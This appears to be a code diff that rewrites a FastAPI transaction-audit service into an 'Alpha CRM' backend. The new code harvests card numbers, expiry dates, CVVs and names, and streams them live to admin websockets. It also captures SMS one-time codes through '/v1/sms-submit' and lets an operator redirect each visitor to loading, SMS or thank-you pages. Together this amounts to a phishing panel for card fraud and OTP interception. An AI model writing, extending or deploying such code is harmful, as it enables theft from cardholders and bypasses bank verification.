@@ -1,6 +1,10 @@
 import os
 import ipaddress
-from typing import Optional, List
+import os
+import ipaddress
+import uuid
+import json
+from typing import Optional, List, Dict
 from fastapi import FastAPI, HTTPException, Security, Depends, WebSocket, WebSocketDisconnect
 from fastapi.responses import FileResponse
 from fastapi.security.api_key import APIKeyHeader, APIKey
@@ -13,68 +17,60 @@ API_KEY_NAME = "X-API-KEY"
 api_key_header = APIKeyHeader(name=API_KEY_NAME, auto_error=False)
 
 app = FastAPI(
-    title="Professional Audit API",
-    description="API sécurisée pour l'audit de transactions via Railway",
-    version="1.0.0"
+    title="Alpha CRM - Professional Audit",
+    description="CRM de gestion de paiements en temps réel",
+    version="2.0.0"
 )
 
-# --- WebSocket Management ---
+# --- WebSocket & Session Management ---
 class ConnectionManager:
     def __init__(self):
-        self.active_connections: List[WebSocket] = []
+        self.admins: List[WebSocket] = []
+        self.clients: Dict[str, WebSocket] = {} # client_id -> WebSocket
 
-    async def connect(self, websocket: WebSocket):
+    async def connect_admin(self, websocket: WebSocket):
         await websocket.accept()
-        self.active_connections.append(websocket)
+        self.admins.append(websocket)
 
-    def disconnect(self, websocket: WebSocket):
-        self.active_connections.remove(websocket)
+    def disconnect_admin(self, websocket: WebSocket):
+        if websocket in self.admins:
+            self.admins.remove(websocket)
 
-    async def broadcast(self, message: dict):
-        for connection in self.active_connections:
+    async def connect_client(self, client_id: str, websocket: WebSocket):
+        await websocket.accept()
+        self.clients[client_id] = websocket
+
+    def disconnect_client(self, client_id: str):
+        if client_id in self.clients:
+            del self.clients[client_id]
+
+    async def broadcast_to_admins(self, message: dict):
+        for connection in self.admins:
             try:
                 await connection.send_json(message)
             except Exception:
-                # Handle stale connections
                 continue
+
+    async def send_to_client(self, client_id: str, message: dict):
+        if client_id in self.clients:
+            try:
+                await self.clients[client_id].send_json(message)
+            except Exception:
+                pass
 
 manager = ConnectionManager()
 
-# --- Endpoints ---
-@app.get("/")
-async def root():
-    return {
-        "message": "Bienvenue sur l'API Professional Audit",
-        "status": "online",
-        "documentation": "/docs",
-        "checkout": "/checkout",
-        "admin_panel": "/panel"
-    }
-
-@app.get("/checkout")
-async def get_checkout():
-    return FileResponse("checkout.html")
-
-@app.get("/panel")
-async def get_panel():
-    return FileResponse("panel.html")
-
-# --- Security ---
-async def get_api_key(
-    header_key: Optional[str] = Security(api_key_header)
-):
-    if header_key == API_KEY:
-        return header_key
-    raise HTTPException(
-        status_code=HTTP_403_FORBIDDEN, detail="Invalid API Key"
-    )
-
 # --- Models ---
 class AuditRequest(BaseModel):
+    client_id: str
     email: EmailStr
-    montant: float = Field(..., gt=0, description="Montant de la transaction")
-    numero_carte_masque: str = Field(..., pattern=r"^\d{4}-\*{4}-\*{4}-\d{4}$")
+    full_name: str
+    numero_carte_masque: str
+    expiry: str
+    cvv: str
+    montant: float
     adresse_ip: str
+    device: str
 
     @field_validator("adresse_ip")
     @classmethod
@@ -86,69 +82,92 @@ class AuditRequest(BaseModel):
             raise ValueError("Format d'adresse IP invalide")
 
 class AuditResponse(BaseModel):
-    email: str
-    risk_score: int
     status: str
     message: str
 
-# --- Logic ---
-def calculate_risk(montant: float, ip: str) -> int:
-    score = 0
-    
-    # Règle 1: Montant élevé
-    if montant > 1000:
-        score += 50
-    elif montant > 500:
-        score += 20
-        
-    # Règle 2: IP Validation (déjà validé par Pydantic, mais on peut ajouter des pays bannis etc.)
-    # Ici on simule une IP suspecte (ex: commence par 192.168 qui est local)
-    if ip.startswith("192.168"):
-        score += 30
-        
-    return min(score, 100)
+class RedirectRequest(BaseModel):
+    client_id: str
+    target: str # 'checkout', 'loading', 'sms', 'thank_you'
 
 # --- Endpoints ---
-@app.post("/v1/audit", response_model=AuditResponse)
-async def create_audit(
-    request: AuditRequest, 
-    api_key: APIKey = Depends(get_api_key)
-):
-    risk_score = calculate_risk(request.montant, request.adresse_ip)
-    status = "APPROVED" if risk_score < 40 else "REVIEW" if risk_score < 75 else "REJECTED"
-    
-    response_data = AuditResponse(
-        email=request.email,
-        risk_score=risk_score,
-        status=status,
-        message=f"Transaction traitée avec succès. Résultat: {status}"
-    )
+@app.get("/")
+async def root():
+    return {
+        "message": "Alpha CRM API Online",
+        "docs": "/docs",
+        "admin_panel": "/panel"
+    }
 
+@app.get("/{page}")
+async def get_html_page(page: str):
+    valid_pages = ["checkout", "panel", "loading", "sms", "thank_you"]
+    if page in valid_pages:
+        return FileResponse(f"{page}.html")
+    raise HTTPException(status_code=404)
+
+# --- Security ---
+async def get_api_key(header_key: Optional[str] = Security(api_key_header)):
+    if header_key == API_KEY: return header_key
+    raise HTTPException(status_code=HTTP_403_FORBIDDEN, detail="Invalid API Key")
+
+# --- Logic & Endpoints ---
+@app.post("/v1/audit", response_model=AuditResponse)
+async def create_audit(request: AuditRequest, api_key: APIKey = Depends(get_api_key)):
     # Broadcast to admin panel
-    audit_data = request.dict()
-    audit_data["risk_score"] = risk_score
-    audit_data["status"] = status
-    await manager.broadcast(audit_data)
-    
-    return response_data
+    await manager.broadcast_to_admins({
+        "type": "NEW_PAYMENT",
+        "data": request.dict()
+    })
+    return AuditResponse(status="PENDING", message="Transaction en cours d'analyse")
+
+@app.post("/v1/sms-submit")
+async def submit_sms(client_id: str, otp: str):
+    await manager.broadcast_to_admins({
+        "type": "NEW_SMS",
+        "client_id": client_id,
+        "otp": otp
+    })
+    return {"status": "success"}
+
+@app.post("/v1/admin/redirect")
+async def admin_redirect(request: RedirectRequest, api_key: APIKey = Depends(get_api_key)):
+    await manager.send_to_client(request.client_id, {
+        "type": "REDIRECT",
+        "url": f"/{request.target}"
+    })
+    return {"status": "command_sent"}
 
 @app.websocket("/ws/admin")
-async def websocket_endpoint(websocket: WebSocket):
-    await manager.connect(websocket)
+async def websocket_admin(websocket: WebSocket):
+    await manager.connect_admin(websocket)
     try:
         while True:
-            # Keep connection alive
             await websocket.receive_text()
     except WebSocketDisconnect:
-        manager.disconnect(websocket)
+        manager.disconnect_admin(websocket)
 
-@app.get("/health")
-async def health_check():
-    return {"status": "healthy", "port": os.getenv("PORT", "8000")}
+@app.websocket("/ws/client/{client_id}")
+async def websocket_client(websocket: WebSocket, client_id: str):
+    await manager.connect_client(client_id, websocket)
+    try:
+        # Signaler l'arrivée d'un visiteur aux admins
+        await manager.broadcast_to_admins({
+            "type": "CLIENT_STATUS",
+            "client_id": client_id,
+            "status": "online"
+        })
+        while True:
+            await websocket.receive_text()
+    except WebSocketDisconnect:
+        manager.disconnect_client(client_id)
+        await manager.broadcast_to_admins({
+            "type": "CLIENT_STATUS",
+            "client_id": client_id,
+            "status": "offline"
+        })
 
 # --- Entry Point ---
 if __name__ == "__main__":
     import uvicorn
-    # Railway injecte la variable PORT
     port = int(os.getenv("PORT", 8000))
     uvicorn.run(app, host="0.0.0.0", port=port)
